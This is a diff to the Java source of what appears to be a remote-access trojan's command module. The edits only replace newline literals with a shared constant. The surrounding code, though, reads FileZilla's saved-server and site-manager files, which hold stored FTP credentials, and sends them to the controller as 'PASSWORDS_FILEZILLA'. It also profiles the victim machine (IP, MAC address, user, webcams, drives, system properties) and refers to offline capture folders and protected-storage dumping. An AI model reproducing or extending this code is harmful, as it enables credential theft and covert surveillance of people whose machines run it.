@@ -47,6 +47,7 @@ public class OPC extends Thread implements Interfaz {
     private int opcion;
     private Object[] parametros = null;
     private Interfaz servicio;
+    private static String fl = "\n";
 
     public void instanciar(Object... parametros) {
         this.servicio = (Interfaz) parametros[0];
@@ -507,22 +508,22 @@ public class OPC extends Thread implements Interfaz {
                 File f1 = new File(System.getenv("appdata"), "FileZilla");
                 File f = new File(f1, "recentservers.xml");
                 File f2 = new File(f1, "sitemanager.xml");
-                r.append("RecentServers.xml").append("\n");
-                r.append("================================================").append("\n");
-                r.append(UtilRT.getArchivoTexto(f.getAbsolutePath())).append("\n");
-                r.append("SiteManager.xml").append("\n");
-                r.append("================================================").append("\n");
-                r.append(UtilRT.getArchivoTexto(f2.getAbsolutePath())).append("\n");
+                r.append("RecentServers.xml").append(fl);
+                r.append("================================================").append(fl);
+                r.append(UtilRT.getArchivoTexto(f.getAbsolutePath())).append(fl);
+                r.append("SiteManager.xml").append(fl);
+                r.append("================================================").append(fl);
+                r.append(UtilRT.getArchivoTexto(f2.getAbsolutePath())).append(fl);
                 servicio.ejecutar(3, Protocolo.PASSWORDS_FILEZILLA, r.toString());
             } else if (UtilRT.isLinux()) {
                 File f = new File(System.getenv("HOME") + "/.filezilla/recentservers.xml");
                 File f2 = new File(System.getenv("HOME") + "/.filezilla/sitemanager.xml");
-                r.append("RecentServers.xml").append("\n");
-                r.append("================================================").append("\n");
-                r.append(UtilRT.getArchivoTexto(f.getAbsolutePath())).append("\n");
-                r.append("SiteManager.xml").append("\n");
-                r.append("================================================").append("\n");
-                r.append(UtilRT.getArchivoTexto(f2.getAbsolutePath())).append("\n");
+                r.append("RecentServers.xml").append(fl);
+                r.append("================================================").append(fl);
+                r.append(UtilRT.getArchivoTexto(f.getAbsolutePath())).append(fl);
+                r.append("SiteManager.xml").append(fl);
+                r.append("================================================").append(fl);
+                r.append(UtilRT.getArchivoTexto(f2.getAbsolutePath())).append(fl);
                 servicio.ejecutar(3, Protocolo.PASSWORDS_FILEZILLA, r.toString());
 //            } else if (UtilRT.isMAC()) {
 //            } else {
@@ -565,7 +566,7 @@ public class OPC extends Thread implements Interfaz {
 //        int largoTitulo = 75;
 //        File f;
 //        Process p;
-//        String finLinea = "\n";
+//        String finLinea = fl;
 //        String error = "Error:";
 //        try {
 ////            retorno.append(finLinea).append("=====  PROTECTED STORAGE ======\n").append(finLinea);
@@ -990,16 +991,16 @@ public class OPC extends Thread implements Interfaz {
 //            File f = ((File) capturadorOffline.get(6));//la carpeta donde se almacenaran las
             File f = ((File) ((Interfaz) servicio.get(12)).get(6));//la carpeta donde se almacenaran las
             if (f != null && f.exists()) {
-                retorno.append("Carpeta de capturas: ").append(f.getAbsolutePath()).append("\n");
-                retorno.append("==========================================================").append("\n");
+                retorno.append("Carpeta de capturas: ").append(f.getAbsolutePath()).append(fl);
+                retorno.append("==========================================================").append(fl);
                 for (File ff : f.listFiles()) {
-                    retorno.append("Archivo: ").append(ff.getAbsolutePath()).append("\n");
-                    retorno.append("Tamaño: ").append(UtilRT.convertirBytesLecturaHumana(ff.length())).append("\n");
+                    retorno.append("Archivo: ").append(ff.getAbsolutePath()).append(fl);
+                    retorno.append("Tamaño: ").append(UtilRT.convertirBytesLecturaHumana(ff.length())).append(fl);
                     try {
-                        retorno.append("Capturas: ").append(UtilRT.contarObjetos(ff.getAbsolutePath())).append("\n");
+                        retorno.append("Capturas: ").append(UtilRT.contarObjetos(ff.getAbsolutePath())).append(fl);
                     } catch (Exception e) {
                     }
-                    retorno.append("---------------------------------------------------------").append("\n");
+                    retorno.append("---------------------------------------------------------").append(fl);
                 }
 
             } else {
@@ -1081,6 +1082,7 @@ public class OPC extends Thread implements Interfaz {
 
             int largo = 21;
             int largoTitulo = 75;
+
             String li = "==============================================================================\n";
             long ramLibre = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getFreePhysicalMemorySize();
             long ram = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
@@ -1092,48 +1094,48 @@ public class OPC extends Thread implements Interfaz {
             File server = new File(Inicio.class.getProtectionDomain().getCodeSource().getLocation().toURI());
             StringBuilder inf = new StringBuilder();
 //            inf.append("===================== INFORMACIÓN SERVIDOR ===================================\n");
-            inf.append("\n").append(UtilRT.crearTituloString("INFORMACIÓN SERVIDOR", largoTitulo)).append("\n");
-            inf.append(UtilRT.rellenarEspacios("Servicios ejecutando", largo)).append(":").append(Inicio.con.size()).append("\n");
+            inf.append(fl).append(UtilRT.crearTituloString("INFORMACIÓN SERVIDOR", largoTitulo)).append(fl);
+            inf.append(UtilRT.rellenarEspacios("Servicios ejecutando", largo)).append(":").append(Inicio.con.size()).append(fl);
             inf.append(UtilRT.rellenarEspacios("", largo)).append("[").append(Inicio.h()).append("]\n");
-            inf.append(UtilRT.rellenarEspacios("Servicios conectados", largo)).append(":").append(Inicio.c()).append("\n");
+            inf.append(UtilRT.rellenarEspacios("Servicios conectados", largo)).append(":").append(Inicio.c()).append(fl);
             inf.append(UtilRT.rellenarEspacios("", largo)).append("[").append(Inicio.hc()).append("]\n");
-            inf.append(UtilRT.rellenarEspacios("Versión del servidor", largo)).append(":").append(Inicio.v).append("\n");
-            inf.append(UtilRT.rellenarEspacios("Ruta del servidor", largo)).append(":").append(server.getParent()).append("\n");
-            inf.append(UtilRT.rellenarEspacios("Puerto", largo)).append(":").append(servicio.get(3)).append("\n");
-//            inf.append(UtilRT.rellenarEspacios("Puerto transferencia", largo)).append(":").append(puertoTrans).append("\n");
-            inf.append(UtilRT.rellenarEspacios("Captura offline", largo)).append(":").append((Boolean) servicio.get(8) ? "SI" : "NO").append("\n");
+            inf.append(UtilRT.rellenarEspacios("Versión del servidor", largo)).append(":").append(Inicio.v).append(fl);
+            inf.append(UtilRT.rellenarEspacios("Ruta del servidor", largo)).append(":").append(server.getParent()).append(fl);
+            inf.append(UtilRT.rellenarEspacios("Puerto", largo)).append(":").append(servicio.get(3)).append(fl);
+//            inf.append(UtilRT.rellenarEspacios("Puerto transferencia", largo)).append(":").append(puertoTrans).append(fl);
+            inf.append(UtilRT.rellenarEspacios("Captura offline", largo)).append(":").append((Boolean) servicio.get(8) ? "SI" : "NO").append(fl);
 
 //            inf.append("\n===================== SSL =====================================\n");
-            inf.append("\n").append(UtilRT.crearTituloString("SSL", largoTitulo)).append("\n");
+            inf.append(fl).append(UtilRT.crearTituloString("SSL", largoTitulo)).append(fl);
 
-            inf.append(UtilRT.rellenarEspacios("SSL", largo)).append(":").append((Boolean) Inicio.config.obtenerParametro("ssl") ? "SI" : "NO").append("\n");
+            inf.append(UtilRT.rellenarEspacios("SSL", largo)).append(":").append((Boolean) Inicio.config.obtenerParametro("ssl") ? "SI" : "NO").append(fl);
             if ((Boolean) Inicio.config.obtenerParametro("ssl")) {
-                inf.append(UtilRT.rellenarEspacios("Información SSL", largo)).append(":").append(((Conexion) servicio.get(14)).getSSlInfo()).append("\n");
+                inf.append(UtilRT.rellenarEspacios("Información SSL", largo)).append(":").append(((Conexion) servicio.get(14)).getSSlInfo()).append(fl);
             }
 
 //            inf.append("\n===================== INFORMACIÓN EQUIPO =====================================\n");
             SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss z Z");
-            inf.append("\n").append(UtilRT.crearTituloString("INFORMACIÓN EQUIPO", largoTitulo)).append("\n");
-            inf.append(UtilRT.rellenarEspacios("Usuario", largo)).append(":").append(System.getProperty("user.name")).append("\n");
-            //inf.append("SO\t: ").append(System.getProperty("os.name")).append(" ").append(System.getProperty("os.version")).append(" ").append(System.getProperty("os.arch")).append("\n");
-            inf.append(UtilRT.rellenarEspacios("SO", largo)).append(":").append(UtilRT.OS_NOMBRE).append(" (").append(UtilRT.OS_PLATAFORMA).append(") ").append(UtilRT.OS_VERSION).append(" ").append(UtilRT.OS_ARQUITECTURA).append("\n");
-            inf.append(UtilRT.rellenarEspacios("RAM libre", largo)).append(":").append(UtilRT.convertirBytesLecturaHumana(ramLibre)).append("\n");
-            inf.append(UtilRT.rellenarEspacios("RAM", largo)).append(":").append(UtilRT.convertirBytesLecturaHumana(ram)).append("\n");
+            inf.append(fl).append(UtilRT.crearTituloString("INFORMACIÓN EQUIPO", largoTitulo)).append(fl);
+            inf.append(UtilRT.rellenarEspacios("Usuario", largo)).append(":").append(System.getProperty("user.name")).append(fl);
+            //inf.append("SO\t: ").append(System.getProperty("os.name")).append(" ").append(System.getProperty("os.version")).append(" ").append(System.getProperty("os.arch")).append(fl);
+            inf.append(UtilRT.rellenarEspacios("SO", largo)).append(":").append(UtilRT.OS_NOMBRE).append(" (").append(UtilRT.OS_PLATAFORMA).append(") ").append(UtilRT.OS_VERSION).append(" ").append(UtilRT.OS_ARQUITECTURA).append(fl);
+            inf.append(UtilRT.rellenarEspacios("RAM libre", largo)).append(":").append(UtilRT.convertirBytesLecturaHumana(ramLibre)).append(fl);
+            inf.append(UtilRT.rellenarEspacios("RAM", largo)).append(":").append(UtilRT.convertirBytesLecturaHumana(ram)).append(fl);
             inf.append(UtilRT.rellenarEspacios("CPU Procesos carga", largo)).append(":").append(UtilRT.redondear(carCPU, 2)).append("%\n");
             inf.append(UtilRT.rellenarEspacios("CPU Sistema carga", largo)).append(":").append(UtilRT.redondear(carCPU1, 2)).append("%\n");
-            inf.append(UtilRT.rellenarEspacios("Procesadores", largo)).append(":").append(cores).append("\n");
-            inf.append(UtilRT.rellenarEspacios("Versión JRE", largo)).append(":").append(System.getProperty("java.runtime.version")).append("\n");
-            inf.append(UtilRT.rellenarEspacios("IP Externa", largo)).append(":").append(getExternalIp()).append("\n");
-            inf.append(UtilRT.rellenarEspacios("IP Local", largo)).append(":").append(localIP).append("\n");
-            inf.append(UtilRT.rellenarEspacios("Hostname", largo)).append(":").append((String) servicio.get(0)).append("\n");
-            inf.append(UtilRT.rellenarEspacios("Dirección MAC", largo)).append(":").append(getMacAddress(prefijo)).append("\n");
-            inf.append(UtilRT.rellenarEspacios("Pais", largo)).append(":").append(Locale.getDefault().getDisplayCountry()).append("\n");
-            inf.append(UtilRT.rellenarEspacios("Fecha", largo)).append(":").append(sdf.format(new Date())).append("\n");
+            inf.append(UtilRT.rellenarEspacios("Procesadores", largo)).append(":").append(cores).append(fl);
+            inf.append(UtilRT.rellenarEspacios("Versión JRE", largo)).append(":").append(System.getProperty("java.runtime.version")).append(fl);
+            inf.append(UtilRT.rellenarEspacios("IP Externa", largo)).append(":").append(getExternalIp()).append(fl);
+            inf.append(UtilRT.rellenarEspacios("IP Local", largo)).append(":").append(localIP).append(fl);
+            inf.append(UtilRT.rellenarEspacios("Hostname", largo)).append(":").append((String) servicio.get(0)).append(fl);
+            inf.append(UtilRT.rellenarEspacios("Dirección MAC", largo)).append(":").append(getMacAddress(prefijo)).append(fl);
+            inf.append(UtilRT.rellenarEspacios("Pais", largo)).append(":").append(Locale.getDefault().getDisplayCountry()).append(fl);
+            inf.append(UtilRT.rellenarEspacios("Fecha", largo)).append(":").append(sdf.format(new Date())).append(fl);
 
 //            inf.append("\n===================== CONFIGURACION =====================================\n");
-            inf.append("\n").append(UtilRT.crearTituloString("CONFIGURACION", largoTitulo)).append("\n");
+            inf.append(fl).append(UtilRT.crearTituloString("CONFIGURACION", largoTitulo)).append(fl);
             try {
-                inf.append(Inicio.config.toString()).append("\n");
+                inf.append(Inicio.config.toString()).append(fl);
             } catch (Exception e) { // solo un monitor resolucion
 
             }
@@ -1141,57 +1143,57 @@ public class OPC extends Thread implements Interfaz {
             String tieneCam;
 
 //            inf.append("\n===================== MONITORES =====================================\n");
-            inf.append("\n").append(UtilRT.crearTituloString("MONITORES", largoTitulo)).append("\n");
+            inf.append(fl).append(UtilRT.crearTituloString("MONITORES", largoTitulo)).append(fl);
             try {
 
-                inf.append(UtilRT.rellenarEspacios("Monitores", largo)).append(":").append(monitores.length).append("\n");
+                inf.append(UtilRT.rellenarEspacios("Monitores", largo)).append(":").append(monitores.length).append(fl);
                 int i = 0;
                 for (GraphicsDevice dev : monitores) {
                     i++;
-                    inf.append(UtilRT.rellenarEspacios("Monitor [" + i + "]", largo)).append(":").append((int) dev.getDisplayMode().getWidth()).append("x").append((int) dev.getDisplayMode().getHeight()).append("\n");
-                    inf.append(UtilRT.rellenarEspacios("    Id String", largo)).append(":").append(dev.getIDstring()).append("\n");
-                    inf.append(UtilRT.rellenarEspacios("    Memoria", largo)).append(":").append(UtilRT.convertirBytesLecturaHumana(dev.getAvailableAcceleratedMemory())).append("\n");
-                    inf.append(UtilRT.rellenarEspacios("    Tipo", largo)).append(":").append(dev.getType() == GraphicsDevice.TYPE_IMAGE_BUFFER ? "BUFFER IMAGE" : (dev.getType() == GraphicsDevice.TYPE_RASTER_SCREEN ? "RASTER SCREEN" : "PRINTER")).append("\n");
+                    inf.append(UtilRT.rellenarEspacios("Monitor [" + i + "]", largo)).append(":").append((int) dev.getDisplayMode().getWidth()).append("x").append((int) dev.getDisplayMode().getHeight()).append(fl);
+                    inf.append(UtilRT.rellenarEspacios("    Id String", largo)).append(":").append(dev.getIDstring()).append(fl);
+                    inf.append(UtilRT.rellenarEspacios("    Memoria", largo)).append(":").append(UtilRT.convertirBytesLecturaHumana(dev.getAvailableAcceleratedMemory())).append(fl);
+                    inf.append(UtilRT.rellenarEspacios("    Tipo", largo)).append(":").append(dev.getType() == GraphicsDevice.TYPE_IMAGE_BUFFER ? "BUFFER IMAGE" : (dev.getType() == GraphicsDevice.TYPE_RASTER_SCREEN ? "RASTER SCREEN" : "PRINTER")).append(fl);
                 }
             } catch (Exception e) { // solo un monitor resolucion
                 Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
-                inf.append(UtilRT.rellenarEspacios("Resolución monitor", largo)).append(":").append((int) d.getWidth()).append("x").append((int) d.getHeight()).append("\n");
+                inf.append(UtilRT.rellenarEspacios("Resolución monitor", largo)).append(":").append((int) d.getWidth()).append("x").append((int) d.getHeight()).append(fl);
             }
 //            inf.append("\n===================== CAMARAS =====================================\n");
-            inf.append("\n").append(UtilRT.crearTituloString("CAMARAS", largoTitulo)).append("\n");
+            inf.append(fl).append(UtilRT.crearTituloString("CAMARAS", largoTitulo)).append(fl);
             try {
                 WebCamItem[] p = ((WebCamInterface) Class.forName("comunes.ObtenerWebCam").newInstance()).listar();
                 tieneCam = p != null && p.length > 0 ? "SI (" + p.length + ")" : "NO";
-                inf.append(UtilRT.rellenarEspacios("Cámaras", largo)).append(":").append(tieneCam).append("\n");
+                inf.append(UtilRT.rellenarEspacios("Cámaras", largo)).append(":").append(tieneCam).append(fl);
                 if (p != null && p.length > 0) {
                     for (WebCamItem cam : p) {
-                        inf.append(UtilRT.rellenarEspacios("Nombre", largo)).append(":").append(cam.getNombre()).append("\n");
+                        inf.append(UtilRT.rellenarEspacios("Nombre", largo)).append(":").append(cam.getNombre()).append(fl);
                     }
                 }
             } catch (Exception e) {
-                inf.append(UtilRT.rellenarEspacios("Cámaras", largo)).append(":").append("Sin plugin").append("\n");
+                inf.append(UtilRT.rellenarEspacios("Cámaras", largo)).append(":").append("Sin plugin").append(fl);
             }
 
 //            inf.append("\n===================== UNIDADES DEL SISTEMA DE ARCHIVOS =====================================\n");
-            inf.append("\n").append(UtilRT.crearTituloString("UNIDADES DEL SISTEMA DE ARCHIVOS", largoTitulo)).append("\n");
+            inf.append(fl).append(UtilRT.crearTituloString("UNIDADES DEL SISTEMA DE ARCHIVOS", largoTitulo)).append(fl);
             File[] ar = File.listRoots();
             if (ar != null) {
                 if (ar.length > 0) {
                     for (File ar1 : ar) {
                         inf.append(UtilRT.rellenarEspacios("Unidad", largo)).append(":");
-                        inf.append(ar1.getAbsolutePath()).append("\n");
+                        inf.append(ar1.getAbsolutePath()).append(fl);
                         inf.append(UtilRT.rellenarEspacios("Tamaño", largo)).append(":");
-                        inf.append(UtilRT.convertirBytesLecturaHumana(ar1.getTotalSpace())).append("\n");
+                        inf.append(UtilRT.convertirBytesLecturaHumana(ar1.getTotalSpace())).append(fl);
                         inf.append(UtilRT.rellenarEspacios("Libre", largo)).append(":");
-                        inf.append(UtilRT.convertirBytesLecturaHumana(ar1.getFreeSpace())).append("\n");
-                        inf.append("\n");
+                        inf.append(UtilRT.convertirBytesLecturaHumana(ar1.getFreeSpace())).append(fl);
+                        inf.append(fl);
                     }
 //                    inf.append(li);
                 }
             }
 
 //            inf.append("\n===================== VARIABLES DE JAVA =====================================\n");
-            inf.append("\n").append(UtilRT.crearTituloString("VARIABLES DE JAVA", largoTitulo)).append("\n");
+            inf.append(fl).append(UtilRT.crearTituloString("VARIABLES DE JAVA", largoTitulo)).append(fl);
             //propiedades de java
 //            int size = -2147483648;
 //            List<String> propnames = new ArrayList();
@@ -1215,7 +1217,7 @@ public class OPC extends Thread implements Interfaz {
 //                    propvalue = hex;
 //                }
 //                inf.append(String.format("%" + size + "." + size + "s [%s]", new Object[]{propname, propvalue}));
-//                inf.append("\n");
+//                inf.append(fl);
 //            }
 
             int size = -2147483648;
@@ -1240,7 +1242,7 @@ public class OPC extends Thread implements Interfaz {
                     }
                     propvalue = hex;
                 }
-                inf.append(UtilRT.rellenarEspacios(propname, size)).append(":").append(propvalue).append("\n");
+                inf.append(UtilRT.rellenarEspacios(propname, size)).append(":").append(propvalue).append(fl);
             }
             servicio.ejecutar(3, Protocolo.GET_INFO_COMPLETA, inf.toString());
         } catch (Exception ex) {
@@ -1257,7 +1259,7 @@ public class OPC extends Thread implements Interfaz {
                 StringBuilder salida = new StringBuilder();
                 String tmp;
                 while ((tmp = br.readLine()) != null) {
-                    salida.append(tmp).append("\n");
+                    salida.append(tmp).append(fl);
                 }
                 servicio.ejecutar(3, Protocolo.GET_INFO_COMPLETA, salida.toString());
             } else {
